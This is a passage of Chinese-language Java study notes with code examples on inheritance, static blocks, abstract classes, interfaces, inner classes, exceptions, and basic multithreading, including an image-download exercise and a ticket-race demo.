<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.OPP.Demo05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I can speak &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221105133112636.png" alt="image-20221105133112636"></p>
</li>
<li><p>低转高（自动），子类转会成父类，可能丢失自己一些自己本来的方法</p>
</li>
</ul>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221105133823911.png" alt="image-20221105133823911"></p>
<h3 id="5、static关键字详解">1.5.5. 5、static关键字详解</h3><ul>
<li>通过static关键字可以直接调用类属性或方法，没有static关键字则需要通过new创建对象才可调用</li>
</ul>
<h4 id="5-1、静态代码块、匿名代码块">1.5.5.1. 5.1、静态代码块、匿名代码块</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo06</span> &#123;</span><br><span class="line">    <span class="comment">// 2 赋初始值</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;匿名代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 1 静态代码块只加载一次</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Demo06</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Demo06</span> <span class="variable">demo1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo06</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;===============================&quot;</span>);</span><br><span class="line">        <span class="type">Demo06</span> <span class="variable">demo2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo06</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221105135906130.png" alt="image-20221105135906130"></p>
<h4 id="5-2、静态导入包">1.5.5.2. 5.2、静态导入包</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Math.random;	<span class="comment">// 一定要加static</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo06</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 如何实现通过random直接调用？</span></span><br><span class="line">        System.out.println(Math.random());</span><br><span class="line">        <span class="comment">// 通过静态导入包，实现直接调用</span></span><br><span class="line">        System.out.println(random());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221105140333335.png" alt="image-20221105140333335"></p>
<h3 id="6、抽象类">1.5.6. 6、抽象类</h3><ul>
<li><p>抽象类不能new只能靠子类实现</p>
</li>
<li><p>一旦类里面有抽象方法，类必须也是抽象类</p>
<p>Person.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在类上加abstract 抽象类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">// 在方法上加abstract 抽象方法，可以只写方法名，不写实现方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Student.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="comment">// 抽象类的所有方法，继承了它的子类，都需要帮他实现~，除非子类也是个抽象类，那么交给它的子类实现...</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I can running&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="7、接口的定义与实现">1.5.7. 7、接口的定义与实现</h3><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221105142333612.png" alt="image-20221105142333612"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221105145135895.png" alt="image-20221105145135895"></p>
<ul>
<li>Java的类是单继承，但是Java的接口是多继承的</li>
<li>接口声明的关键字是interface</li>
</ul>
<p>UserService.java – 类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.OPP.Demo08;</span><br><span class="line"><span class="comment">// 类可以实现接口 implenents 接口</span></span><br><span class="line"><span class="comment">// 实现接口的类，就必须重写接口中的方法</span></span><br><span class="line"><span class="comment">// 侧面反应可以通过接口实现伪多继承</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span>,TimeService&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        name = <span class="string">&quot;王五&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        name = <span class="string">&quot;赵四&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">query</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        name = <span class="string">&quot;李六&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">timer</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;what time?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>UserServiceImol.java – 接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.OPP.Demo08;</span><br><span class="line"></span><br><span class="line"><span class="comment">// interface 定义关键字，接口都需要实现类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="comment">// 接口里面的方法默认都是public abstract，可以省略不写</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">query</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TimeService.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.OPP.Demo08;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TimeService</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">timer</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221105145503331.png" alt="image-20221105145503331"></p>
<h3 id="8、N种内部类">1.5.8. 8、N种内部类</h3><p>内部类可以获得外部类的私有属性、方法~</p>
<ul>
<li>成员内部类</li>
<li>局部内部类</li>
<li>匿名内部类</li>
</ul>
<p>Outer.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.OPP.Demo9;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">out</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是一个外部类 &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 成员内部类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inner</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">in</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是个内部类&quot;</span>);</span><br><span class="line">            System.out.println(age);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 局部内部类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">mider</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Inner</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 匿名内部类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 没有名字的初始化类，不用将实例保存在变量中</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Apple</span>().eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个Java文件中可以有很多类，但只能有一个public类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Apple</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I can eat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Application.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.OPP;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> src.OPP.Demo9.Outer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Outer</span> <span class="variable">outer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>();</span><br><span class="line">        <span class="comment">// 通过外部类，new一个内部类</span></span><br><span class="line">        Outer.<span class="type">Inner</span> <span class="variable">inner</span> <span class="operator">=</span> outer.<span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">        inner.in();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221105155150801.png" alt="image-20221105155150801"></p>
<h2 id="异常">1.6. 异常</h2><h3 id="1、Error和Exception">1.6.1. 1、Error和Exception</h3><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221105161049705.png" alt="image-20221105161049705"></p>
<h3 id="2、异常处理机制">1.6.2. 2、异常处理机制</h3><ul>
<li><p>抛出异常</p>
</li>
<li><p>捕获异常</p>
</li>
<li><p>异常处理五个关键字:</p>
<ul>
<li>try、catch、finally、throw、throws</li>
</ul>
</li>
<li><p>CTRL + ALT + T快速生成异常，if else等</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.exception.Demo01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123; <span class="comment">// 监控区域</span></span><br><span class="line">            <span class="keyword">if</span> (b == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArithmeticException</span>();    <span class="comment">// throw主动抛出异常,通常在方法体里操作</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ArithmeticException e)&#123; <span class="comment">// 捕获区域 catch(想要捕获的异常类型)，catch可以多个类似于if，异常等级要层层递进</span></span><br><span class="line">            System.out.println(<span class="string">&quot;被除数变量b不能为0&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;  <span class="comment">// 善后工作，类似于IO关闭等</span></span><br><span class="line">            System.out.println(<span class="string">&quot;End&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>throws</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Demo01</span> <span class="variable">demo01</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo01</span>();</span><br><span class="line">        demo01.Test(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Test</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span> <span class="keyword">throws</span> ArithmeticException&#123;</span><br><span class="line">        System.out.println(a/b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221105163035728.png" alt="image-20221105163035728"></p>
<h2 id="Process（进程）与Thread（线程）">1.7. Process（进程）与Thread（线程）</h2><ul>
<li>进程：指执行程序的一次执行过程，是系统资源分配的单位</li>
<li>线程：一个进程里可以包含多个线程，一个进程中至少有一个线程（main函数就是主线程），线程是CPU调度和执行的单位</li>
</ul>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221105190304967.png" alt="image-20221105190304967"></p>
<h3 id="1、多线程">1.7.1. 1、多线程</h3><h4 id="1-1、线程的创建三种方法">1.7.1.1. 1.1、线程的创建三种方法</h4><ul>
<li><p><strong>Thread class &#x3D;&#x3D;&gt; 继承Thread类</strong></p>
</li>
<li><p><strong>Runnable接口 &#x3D;&#x3D;&gt; 实现Runnable接口</strong></p>
</li>
<li><p>Callable接口 &#x3D;&#x3D;&gt; 实现Callable接口</p>
</li>
</ul>
<h5 id="1-1-1、继承Thread类">1.7.1.1.1. 1.1.1、继承Thread类</h5><ul>
<li>自定义线程类继承Thread类</li>
<li>重现run()方法，编程线程执行体</li>
<li>创建线程对象，调用start()方法启动线程</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注意:线程开启不一定立即执行，由CPU调度执行</span></span><br><span class="line"><span class="comment">// 创建线程方式1:继承Thread类，重写run()方法，调用start开启线程</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestThread01</span> <span class="keyword">extends</span> <span class="title class_">Thread</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// run方法线程体</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;run---&quot;</span>+i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 实现化thread对象</span></span><br><span class="line">        <span class="type">TestThread01</span> <span class="variable">testThread01</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestThread01</span>();</span><br><span class="line">        testThread01.start();</span><br><span class="line">        <span class="comment">// main线程</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;main---&quot;</span>+i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果如下，可以看出两个线程是同时执行的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main---0</span><br><span class="line">main---1</span><br><span class="line">main---2</span><br><span class="line">main---3</span><br><span class="line">main---4</span><br><span class="line">main---5</span><br><span class="line">main---6</span><br><span class="line">run---0</span><br><span class="line">run---1</span><br><span class="line">run---2</span><br><span class="line">run---3</span><br><span class="line">run---4</span><br><span class="line">run---5</span><br><span class="line">run---6</span><br><span class="line">run---7</span><br><span class="line">run---8</span><br><span class="line">run---9</span><br><span class="line">main---7</span><br><span class="line">main---8</span><br><span class="line">main---9</span><br><span class="line">main---10</span><br><span class="line">run---10</span><br><span class="line">run---11</span><br><span class="line">main---11</span><br><span class="line">main---12</span><br><span class="line">main---13</span><br><span class="line">main---14</span><br><span class="line">main---15</span><br><span class="line">main---16</span><br><span class="line">main---17</span><br><span class="line">main---18</span><br><span class="line">main---19</span><br><span class="line">run---12</span><br><span class="line">run---13</span><br><span class="line">run---14</span><br><span class="line">run---15</span><br><span class="line">run---16</span><br><span class="line">run---17</span><br><span class="line">run---18</span><br><span class="line">run---19</span><br></pre></td></tr></table></figure>

<p>如果这里调用run()方法而不是，调用start()，则它是单线程执行的，按顺序进行输出</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221106102237335.png" alt="image-20221106102237335"></p>
<ul>
<li>练习：多线程下载图片</li>
</ul>
<p><a href="https://commons.apache.org/proper/commons-io/">apache commons io 官网</a></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221106104416922.png" alt="image-20221106104416922"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.Thread.TestThread01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 练习Thread,实现多线程同步下载图片</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String url; <span class="comment">// 网络图片地址</span></span><br><span class="line">    <span class="keyword">private</span> String name; <span class="comment">// 保存的文件名</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Demo01</span><span class="params">(String url,String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.url = url;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 执行主体</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">WebDownloader</span> <span class="variable">webDownloader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebDownloader</span>();</span><br><span class="line">        webDownloader.downloader(url,name);</span><br><span class="line">        System.out.println(<span class="string">&quot;下载了文件名为:&quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Demo01</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo01</span>(<span class="string">&quot;https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221106102237335.png&quot;</span>,<span class="string">&quot;1.jpg&quot;</span>);</span><br><span class="line">        <span class="type">Demo01</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo01</span>(<span class="string">&quot;https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221105190304967.png&quot;</span>,<span class="string">&quot;2.jpg&quot;</span>);</span><br><span class="line">        <span class="type">Demo01</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo01</span>(<span class="string">&quot;https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221105163035728.png&quot;</span>,<span class="string">&quot;3.jpg&quot;</span>);</span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WebDownloader</span>&#123;</span><br><span class="line">    <span class="comment">// 下载方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">downloader</span><span class="params">(String url,String name)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileUtils.copyURLToFile(<span class="keyword">new</span> <span class="title class_">URL</span>(url),<span class="keyword">new</span> <span class="title class_">File</span>(name));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            System.out.println(<span class="string">&quot;IO异常&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221107214637414.png" alt="image-20221107214637414"></p>
<h5 id="1-1-2、实现Runnable接口">1.7.1.1.2. 1.1.2、实现Runnable接口</h5><ul>
<li>定义MyRnnable类实现Runnable接口</li>
<li>实现run()方法,编写线程进程体</li>
<li>创建线程对象，调用start()方法启动线程</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.Thread.TestThread02;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建线程方式2: 实现runnable接口，重写run方法，执行线程需要丢入runnable接口实现类，调用start方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestThread02</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;run---&quot;</span>+i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建runnable接口的实现类对象</span></span><br><span class="line">        <span class="type">TestThread02</span> <span class="variable">testThread02</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestThread02</span>();</span><br><span class="line">        <span class="comment">// 创建线程对象，通过线程对象来开启我们的线程，代理</span></span><br><span class="line">        <span class="comment">// 需要将对象放到Thread中进行调用</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(testThread02).start();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;main---&quot;</span>+i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221107220214316.png" alt="image-20221107220214316"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221107220409922.png" alt="image-20221107220409922"></p>
<ul>
<li>练习：抢火车票</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.Thread.TestThread03;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多线程操作同一个资源的情况下，线程不安全，数据</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestThread03</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ticketNums</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (ticketNums&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Thread.currentThread().getName()获取当前线程的名称</span></span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;拿到了第&quot;</span> + ticketNums-- + <span class="string">&quot;票&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">TestThread03</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestThread03</span>();</span><br><span class="line">        <span class="comment">// 将线程命名,由Thread.currentThread().getName()获取</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(ticket,<span class="string">&quot;小明&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(ticket,<span class="string">&quot;小红&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(ticket,<span class="string">&quot;黄牛&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221108212618880.png" alt="image-20221108212618880"></p>
